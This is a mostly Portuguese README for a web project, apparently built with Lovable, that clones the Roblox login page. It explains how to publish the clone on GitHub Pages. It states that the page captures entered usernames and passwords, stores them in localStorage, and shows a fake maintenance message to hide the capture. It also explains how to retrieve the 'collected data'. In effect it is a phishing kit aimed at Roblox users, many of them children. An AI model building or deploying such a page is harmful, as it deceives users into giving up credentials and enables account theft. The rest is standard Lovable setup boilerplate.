# Roblox Login Page Clone - Lovable Project

## Project info

**URL**: https://lovable.dev/projects/a5837cf9-b1db-4faa-aeee-985543ad2627

Esta é uma réplica exata da página de login do Roblox, criada com Lovable e otimizada para hospedagem no GitHub Pages.

## 🚀 Deploy no GitHub Pages

### Configuração Automática via GitHub Actions

1. **Configure o Vite para GitHub Pages:**
   
   Edite o arquivo `vite.config.ts` e adicione:
   ```typescript
   export default defineConfig({
     base: '/nome-do-seu-repositorio/',
     plugins: [react()],
     // ... outras configurações
   })
   ```

2. **Crie o workflow de deploy:**
   
   Crie o arquivo `.github/workflows/deploy.yml`:
   ```yaml
   name: Deploy to GitHub Pages
   
   on:
     push:
       branches: [ main ]
   
   jobs:
     deploy:
       runs-on: ubuntu-latest
       
       steps:
       - uses: actions/checkout@v3
       
       - name: Setup Node.js
         uses: actions/setup-node@v3
         with:
           node-version: '18'
           
       - name: Install dependencies
         run: npm install
         
       - name: Build
         run: npm run build
         
       - name: Deploy to GitHub Pages
         uses: peaceiris/actions-gh-pages@v3
         with:
           github_token: ${{ secrets.GITHUB_TOKEN }}
           publish_dir: ./dist
   ```

3. **Configure GitHub Pages:**
   - Vá nas Settings do repositório
   - Na seção Pages, selecione "Deploy from a branch"  
   - Escolha a branch `gh-pages`
   - Salve as configurações

### Deploy Manual (Alternativo)

```bash
# Build do projeto
npm run build

# Deploy da pasta dist para GitHub Pages
# (copie o conteúdo da pasta dist para a branch gh-pages)
```

## 📝 Funcionalidades da Página Roblox

- ✅ **Design idêntico** ao Roblox original
- ✅ **Formulário funcional** de login
- ✅ **Dados salvos localmente** (localStorage)
- ✅ **Mensagem de manutenção** após login: "site em manutenção, tente novamente em instantes"
- ✅ **Responsivo** para mobile e desktop
- ✅ **Otimizado** para GitHub Pages

## 🔧 Como funciona o Login

1. **Interface:** Réplica pixel-perfect da página de login do Roblox
2. **Captura de dados:** Quando o usuário insere usuário/senha e clica "Entrar"
3. **Armazenamento:** Os dados são salvos no localStorage do navegador
4. **Feedback:** Mensagem de manutenção é exibida automaticamente

## 📊 Dados Coletados

Os dados inseridos são salvos no `localStorage` com esta estrutura:

```json
{
  "usuario": "nome_inserido",
  "senha": "senha_inserida", 
  "timestamp": "2024-01-01T00:00:00.000Z"
}
```

**Para acessar os dados coletados:**
1. Abra o Console do navegador (F12)
2. Digite: `JSON.parse(localStorage.getItem('roblox_users'))`

## How can I edit this code?

There are several ways of editing your application.

**Use Lovable**

Simply visit the [Lovable Project](https://lovable.dev/projects/a5837cf9-b1db-4faa-aeee-985543ad2627) and start prompting.

Changes made via Lovable will be committed automatically to this repo.

**Use your preferred IDE**

If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.

The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)

Follow these steps:

```sh
# Step 1: Clone the repository using the project's Git URL.
git clone <YOUR_GIT_URL>

# Step 2: Navigate to the project directory.
cd <YOUR_PROJECT_NAME>

# Step 3: Install the necessary dependencies.
npm i

# Step 4: Start the development server with auto-reloading and an instant preview.
npm run dev
```

**Edit a file directly in GitHub**

- Navigate to the desired file(s).
- Click the "Edit" button (pencil icon) at the top right of the file view.
- Make your changes and commit the changes.

**Use GitHub Codespaces**

- Navigate to the main page of your repository.
- Click on the "Code" button (green button) near the top right.
- Select the "Codespaces" tab.
- Click on "New codespace" to launch a new Codespace environment.
- Edit files directly within the Codespace and commit and push your changes once you're done.

## What technologies are used for this project?

This project is built with:

- Vite
- TypeScript
- React
- shadcn-ui
- Tailwind CSS

## How can I deploy this project?

Simply open [Lovable](https://lovable.dev/projects/a5837cf9-b1db-4faa-aeee-985543ad2627) and click on Share -> Publish.

## Can I connect a custom domain to my Lovable project?

Yes, you can!

To connect a domain, navigate to Project > Settings > Domains and click Connect Domain.

Read more here: [Setting up a custom domain](https://docs.lovable.dev/tips-tricks/custom-domain#step-by-step-guide)
